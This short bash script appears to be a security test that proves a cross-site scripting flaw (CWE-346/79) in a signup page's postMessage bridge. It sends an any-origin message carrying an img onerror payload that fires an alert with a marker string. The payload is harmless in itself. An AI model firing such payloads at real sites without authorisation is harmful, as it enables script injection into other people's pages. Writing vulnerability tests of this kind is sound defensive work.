#!/usr/bin/env bash
# POSTMSG-001 (CWE-346/79): the signup page's bridge renders any-origin messages as HTML.
set -eu; . "$(dirname "$0")/_lib.sh"
M="POSTMSG-PROVEN-7f3a"
JS="window.postMessage({type:'taskflow:notice',html:\"<img src=x onerror=alert('$M')>\"},'*'); await new Promise(function(r){setTimeout(r,1500);}); return 'sent';"
browser_dialog "$TARGET/signup" "$M" --eval "$JS"
